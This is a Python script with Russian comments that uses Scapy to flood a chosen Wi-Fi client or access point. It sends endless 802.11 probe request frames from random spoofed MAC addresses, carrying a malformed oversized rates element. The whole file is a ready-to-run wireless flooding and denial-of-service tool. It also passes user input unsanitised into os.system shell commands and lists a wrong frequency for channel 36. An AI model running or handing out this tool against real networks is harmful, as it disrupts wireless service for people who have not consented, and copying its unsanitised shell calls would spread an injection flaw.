#-*-coding:utf-8 -*-
from scapy.all import * # Импортируем Scapy
import threading
import sys
import os
import random

channeldict = { '1' : 2412, '2':2417, '3':2422, '4':2427, '5':2432, '6':2437, '7':2442, '8':2447, '9':2452, '10':2457, '11':2462, '12':2467, '13':2472, '36': 5018 } #Создаем словарь канал : частота
channel = input("Введите номер канала: ")
targetmac = input("Введите MAC-адрес атакуемого (ввозможен ввод широковещательного адреса): ")
targetbssid = input("Введите BSSID атакуемого (возможен ввод широковещательного BSSID): ")
countframe = input("Введите количество фреймов: ")
countframefloat = float(countframe)
interframe = input("Введите интервал фрейма (желательно ввести .00001): ")
interframefloat = float(interframe)
interface = input("Введите сетевой интерфейс: ")
os.system("iw "+interface + " set channel " + channel)#Переключаем беспроводный адаптер на заданный канал.
randomdigital = {1:'1', 2:'2',3:'3',4:'4',5:'5',6:'6',7:'7',8:'8',9:'9',10:'a',11:'b',12:'c',13:'d',14:'e',15:'f'} #Создаем словарь для генерации случайного MAC-адреса
while(1):
	attackmac = randomdigital[random.randint(1, 15)]+randomdigital[random.randint(1, 15)]+':'+randomdigital[random.randint(1, 15)]+randomdigital[random.randint(1, 15)]+':'+randomdigital[random.randint(1, 15)]+randomdigital[random.randint(1, 15)]+':'+randomdigital[random.randint(1, 15)]+randomdigital[random.randint(1, 15)]+':'+randomdigital[random.randint(1, 15)]+randomdigital[random.randint(1, 15)]+':'+randomdigital[random.randint(1, 15)]+randomdigital[random.randint(1, 15)] #Генерируем случайный MAC-адрес
	packet = RadioTap(version = 0, pad =0, present = 0x2000408e, Lock_Quality = 100, ChannelFrequency = channeldict[channel], Rate = 1.0)/Dot11(addr1= targetmac,addr2 =attackmac, addr3 = targetbssid, type = 0, subtype= 4)/Dot11ProbeReq()/Dot11EltRates(rates=[1,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,6,9,12,18,24,36,48,54])/Dot11Elt()#Генерируем фрейм при помощи scapy
	os.system("iw "+interface + " set channel " + channel)
	sendp(packet, iface = interface, count = countframefloat, inter = interframefloat) #Отправляем данный фрейм.